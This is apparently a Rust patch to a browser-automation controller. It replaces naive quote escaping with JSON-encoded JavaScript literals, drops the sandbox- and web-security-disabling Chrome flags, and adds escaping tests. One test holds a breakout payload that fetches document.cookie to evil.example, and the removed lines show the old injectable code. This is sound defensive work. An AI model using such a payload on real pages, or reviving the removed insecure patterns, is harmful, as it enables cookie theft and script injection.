@@ -93,6 +93,18 @@ impl BrowserController {
         Self::launch_fresh_instance().await
     }
 
+    /// Encode an arbitrary string as a JavaScript string literal.
+    ///
+    /// Untrusted values (CSS selectors, form values, attribute names) must reach
+    /// injected JavaScript as data, never as code. JSON encoding escapes quotes,
+    /// backslashes, newlines, and control characters, so nothing can break out of
+    /// the string context (audit 2026-02-08 item #4). The returned literal
+    /// includes its own surrounding double quotes.
+    fn js_string_literal(value: &str) -> String {
+        // Display for serde_json::Value is infallible, unlike serde_json::to_string.
+        serde_json::Value::String(value.to_owned()).to_string()
+    }
+
     /// Evaluate a JavaScript function expression and return its result as JSON.
     ///
     /// Returns `Value::Null` when the script yields nothing, so callers can treat
@@ -534,15 +546,15 @@ impl BrowserController {
             }
         };
 
-        // Configure the launcher with more resilient options and enable remote debugging
+        // Configure the launcher with more resilient options and enable remote debugging.
+        // Security note: never pass "--no-sandbox" or "--disable-web-security" here.
+        // Automation only touches the top-level document, so same-origin policy and
+        // the Chrome sandbox stay fully enabled (audit 2026-02-08 item #17).
         let args = vec![
             "--no-first-run",
             "--no-default-browser-check",
-            "--no-sandbox",
             // Enable remote debugging for future connections
             "--remote-debugging-port=9222",
-            // Reduce security restrictions for automation
-            "--disable-web-security",
             // Improve stability
             "--disable-features=VizDisplayCompositor",
         ];
@@ -1096,26 +1108,27 @@ impl BrowserController {
         // DOM property (`.value`, `.checked`, ...), which is the only way to see
         // state changed after parse (e.g. what `interact`'s `type` action wrote).
         let accessor = if let Some(attr) = attribute {
-            format!(r#"el.getAttribute("{}")"#, attr.replace(r#"""#, r#"\""#))
+            format!("el.getAttribute({})", Self::js_string_literal(attr))
         } else if let Some(prop) = property {
-            format!(r#"el["{}"]"#, prop.replace(r#"""#, r#"\""#))
+            format!("el[{}]", Self::js_string_literal(prop))
         } else {
             "el.textContent".to_string()
         };
-        let escaped_selector = selector.replace(r#"""#, r#"\""#);
+        // JSON-encoded literal: the selector is passed as data, not code.
+        let selector_literal = Self::js_string_literal(selector);
 
         // JavaScript approach keeps selector semantics consistent across engines
         let js_fn = if multiple {
             format!(
                 r#"function() {{
-                    const elements = Array.from(document.querySelectorAll("{escaped_selector}"));
+                    const elements = Array.from(document.querySelectorAll({selector_literal}));
                     return elements.map(el => {accessor});
                 }}"#
             )
         } else {
             format!(
                 r#"function() {{
-                    const el = document.querySelector("{escaped_selector}");
+                    const el = document.querySelector({selector_literal});
                     return el ? {accessor} : null;
                 }}"#
             )
@@ -1173,12 +1186,12 @@ impl BrowserController {
                 // Use JavaScript to perform the click
                 let js_fn = format!(
                     r#"function() {{
-                        const element = document.querySelector("{}");
+                        const element = document.querySelector({});
                         if (!element) return false;
                         element.click();
                         return true;
                     }}"#,
-                    selector.replace(r#"""#, r#"\""#)
+                    Self::js_string_literal(selector)
                 );
 
                 // Add proper type annotations to evaluate
@@ -1223,20 +1236,20 @@ impl BrowserController {
                 // Use JavaScript to fill the field
                 let js_fn = format!(
                     r#"function() {{
-                        const element = document.querySelector("{}");
+                        const element = document.querySelector({});
                         if (!element) return false;
 
                         // Clear the field first
                         element.value = "";
 
                         // Then set the value and trigger events
-                        element.value = "{}";
+                        element.value = {};
                         element.dispatchEvent(new Event('input', {{ bubbles: true }}));
                         element.dispatchEvent(new Event('change', {{ bubbles: true }}));
                         return true;
                     }}"#,
-                    selector.replace(r#"""#, r#"\""#),
-                    value.replace(r#"""#, r#"\""#)
+                    Self::js_string_literal(selector),
+                    Self::js_string_literal(value)
                 );
 
                 match Self::eval_json(page, &js_fn).await {
@@ -1277,18 +1290,18 @@ impl BrowserController {
                 // Use JavaScript for selecting an option
                 let js_fn = format!(
                     r#"function() {{
-                        const element = document.querySelector("{}");
+                        const element = document.querySelector({});
                         if (!element) return false;
 
                         // Set the value
-                        element.value = "{}";
+                        element.value = {};
 
                         // Trigger change event
                         element.dispatchEvent(new Event('change', {{ bubbles: true }}));
                         return true;
                     }}"#,
-                    selector.replace(r#"""#, r#"\""#),
-                    value.replace(r#"""#, r#"\""#)
+                    Self::js_string_literal(selector),
+                    Self::js_string_literal(value)
                 );
 
                 match Self::eval_json(page, &js_fn).await {
@@ -1396,7 +1409,7 @@ impl BrowserController {
             // then use clipping
             let js_fn = format!(
                 r#"function() {{
-                    const element = document.querySelector("{}");
+                    const element = document.querySelector({});
                     if (!element) return null;
 
                     const rect = element.getBoundingClientRect();
@@ -1407,7 +1420,7 @@ impl BrowserController {
                         height: rect.height
                     }};
                 }}"#,
-                sel.replace(r#"""#, r#"\""#)
+                Self::js_string_literal(sel)
             );
 
             // Get element position
@@ -1684,6 +1697,70 @@ impl Drop for BrowserController {
                     }
                 }
             }
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::BrowserController;
+
+    #[test]
+    fn js_string_literal_wraps_plain_text_in_quotes() {
+        assert_eq!(
+            BrowserController::js_string_literal("div.content"),
+            r#""div.content""#
+        );
+    }
+
+    #[test]
+    fn js_string_literal_escapes_double_quotes() {
+        assert_eq!(
+            BrowserController::js_string_literal(r#"a[href="x"]"#),
+            r#""a[href=\"x\"]""#
+        );
+    }
+
+    #[test]
+    fn js_string_literal_escapes_backslashes() {
+        // A trailing backslash must not be able to swallow the closing quote.
+        assert_eq!(BrowserController::js_string_literal(r"end\"), r#""end\\""#);
+        assert_eq!(
+            BrowserController::js_string_literal(r#"\"; alert(1); //"#),
+            r#""\\\"; alert(1); //""#
+        );
+    }
+
+    #[test]
+    fn js_string_literal_escapes_newlines_and_control_chars() {
+        assert_eq!(
+            BrowserController::js_string_literal("line1\nline2"),
+            r#""line1\nline2""#
+        );
+        assert_eq!(
+            BrowserController::js_string_literal("a\r\t\u{0}b"),
+            "\"a\\r\\t\\u0000b\""
+        );
+    }
+
+    #[test]
+    fn js_string_literal_breakout_attempt_stays_data() {
+        // The classic breakout from the old `.replace('"', "\\\"")` approach:
+        // a backslash before the injected quote defeated naive escaping.
+        let attack = r#"\"); fetch("https://evil.example/?c="+document.cookie); ("#;
+        let literal = BrowserController::js_string_literal(attack);
+        // Round-trips as a single JSON string: nothing escaped the literal.
+        let parsed: serde_json::Value =
+            serde_json::from_str(&literal).unwrap_or(serde_json::Value::Null);
+        assert_eq!(parsed.as_str(), Some(attack));
+        // The interior of the literal contains no unescaped double quote.
+        let interior = &literal[1..literal.len() - 1];
+        let mut prev_backslash = false;
+        for c in interior.chars() {
+            if c == '"' {
+                assert!(prev_backslash, "unescaped quote inside literal");
+            }
+            prev_backslash = c == '\\' && !prev_backslash;
         }
     }
 }
